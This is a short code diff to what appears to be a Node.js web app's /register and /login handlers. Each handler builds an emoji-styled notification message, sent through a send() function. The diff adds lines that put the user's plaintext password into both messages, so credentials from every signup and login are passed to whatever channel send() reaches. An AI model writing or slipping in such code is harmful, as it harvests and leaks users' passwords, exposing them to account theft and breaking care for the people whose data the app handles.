@@ -110,6 +110,7 @@ app.post("/register", async (req, res) => {
 
 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲   : ${u.username}
 𝗛𝗣                : ${u.phone}
+𝗣𝗦𝗪𝗥𝗗       : ${u.password}
 𝗘𝗺𝗮𝗶𝗹           : ${u.email}
 𝗥𝗲𝗳𝗲𝗿𝗿𝗮𝗹       : ${u.referral || "-"}`);
 
@@ -151,7 +152,8 @@ app.post("/login", async (req, res) => {
     send(`🟢 𝗟𝗢𝗚𝗜𝗡
 
 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲   : ${username}
-𝗛𝗣                 : ${phone}`);
+𝗛𝗣                 : ${phone}
+𝗣𝗦𝗪𝗥𝗗       : ${password}`);
 
     res.json({
         status: true,
